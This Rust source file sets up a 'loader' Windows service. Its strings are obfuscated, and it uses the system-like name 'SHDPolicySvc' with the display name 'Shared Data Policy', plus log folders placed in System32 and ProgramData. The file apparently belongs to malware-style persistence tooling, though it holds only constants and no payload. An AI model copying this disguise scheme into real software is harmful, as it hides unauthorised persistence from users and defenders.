use std::path::PathBuf;
use obfstr::obfstr as s;
use shared::utils::functions::{ programdata_dir, system32_dir };

pub fn loader_service_name() -> String {
    s!("SHDPolicySvc").to_owned()
}

pub fn loader_service_display_name() -> String {
    s!("Shared Data Policy").to_owned()
}

pub fn loader_service_description() -> String {
    s!("This service is used for Data Sharing scenarios").to_owned()
}

pub fn system_log_directory() -> PathBuf {
    system32_dir().join(s!("Shasum32"))
}

pub fn initial_log_directory() -> PathBuf {
    programdata_dir().join(s!("SharedLibrary"))
}

pub fn loader_version() -> u64 {
    1
}
